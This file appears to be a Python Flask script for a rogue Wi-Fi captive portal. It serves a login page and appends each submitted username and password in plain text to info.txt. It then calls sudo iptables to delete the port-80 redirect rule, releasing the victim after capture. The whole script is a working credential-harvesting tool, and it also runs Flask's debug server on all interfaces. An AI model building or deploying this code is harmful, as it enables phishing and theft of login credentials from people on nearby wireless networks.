from flask import Flask, render_template, request
import subprocess
import time
import sys
app = Flask(__name__)
if len(sys.argv) > 2:
    iface_wifi = sys.argv[1]
    portal_address = sys.argv[2]
    print(f"the wifi is {iface_wifi}")
    print(f"the portal address is {portal_address}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Get the submitted username and password
    username = request.form['username']
    password = request.form['password']

    with open("info.txt", "a") as f:
        f.write(f"username: {username} \npassword: {password}\n")


    subprocess.call(
        ['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '80', '-j',
         'DNAT', '--to-destination', portal_address])

    return {"answer": "hello"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)